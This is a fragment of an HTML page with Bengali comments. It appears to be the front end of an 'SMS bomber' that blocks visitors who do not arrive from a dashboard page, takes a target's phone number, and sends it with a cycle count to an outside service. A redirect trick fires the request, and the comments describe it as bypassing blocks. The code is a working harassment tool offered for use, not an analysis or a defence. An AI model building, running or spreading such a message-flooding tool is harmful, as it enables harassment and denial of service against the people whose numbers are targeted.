<script>
    // আপনার নিরাপত্তা কোড (ডাইরেক্ট অ্যাক্সেস ব্লক) অক্ষুণ্ণ থাকবে
    (function() {
      const referrer = document.referrer;
      const allowedReferrers = ['dashboard.html', 'special_dashboard.html']; 
      let isAllowed = false;

      for (const allowed of allowedReferrers) {
          if (referrer.includes(allowed)) {
              isAllowed = true;
              break;
          }
      }

      if (!isAllowed) {
          window.location.replace('index.html');
      }
    })();
  </script>
</head>
<body>
    
  <script>
    function triggerSMSBoom() {
        const numberInput = document.getElementById('targetNumber');
        const statusDiv = document.getElementById('status');
        const number = numberInput.value.trim();
        
        // ১. ইনপুট ভ্যালিডেশন
        if (!number || number.length < 10) {
            statusDiv.textContent = 'দয়া করে সঠিক নম্বর দিন!';
            statusDiv.style.color = '#ff0055'; 
            statusDiv.style.textShadow = '0 0 8px #ff0055';
            return;
        }

        // ২. API URL
        // আপনার API URL, যা এখন রিডাইরেক্টের জন্য ব্যবহৃত হবে
        const apiUrl = `http://mahfuz-boom.gt.tc/?number=${number}&cycles=3`;
        
        // ৩. স্ট্যাটাস আপডেট
        statusDiv.textContent = 'SMS B00M শুরু হচ্ছে... (ব্লক বাইপাস করা হচ্ছে)';
        statusDiv.style.color = '#00eaff';
        statusDiv.style.textShadow = '0 0 8px #00eaff';

        // ৪. চূড়ান্ত কৌশল: দ্রুত রিডাইরেক্ট এবং ফেরত আসা (The Redirect Trick)
        
        // ক. বর্তমান URL সংরক্ষণ করা
        const currentPageUrl = window.location.href;

        // খ. এক মুহূর্তের জন্য API URL এ রিডাইরেক্ট করা
        window.location.replace(apiUrl);

        // গ. দ্রুত ফেরত আসার জন্য টাইমআউট
        // API কলটি শুরু হওয়ার জন্য ০.৫ সেকেন্ডের বেশি সময় দেওয়া উচিত নয়।
        setTimeout(() => {
            // API কল শুরু হওয়ার পর দ্রুত আপনার পেজে ফেরত আসা
            window.location.replace(currentPageUrl);
        }, 500); // ০.৫ সেকেন্ড পর ফেরত আসবে
        
        // ঘ. ব্যবহারকারীকে আশ্বাস দেওয়া (এই বার্তাটি দেখানোর আগেই রিডাইরেক্ট হবে, 
        // কিন্তু এটি কোডটি বোঝার জন্য রাখা হয়েছে)
        statusDiv.textContent = `সফল! বোমবিং শুরু হয়েছে।`;
        statusDiv.style.color = '#00ffaa'; 
        statusDiv.style.textShadow = '0 0 8px #00ffaa';

    }
  </script>
</body>
</html>
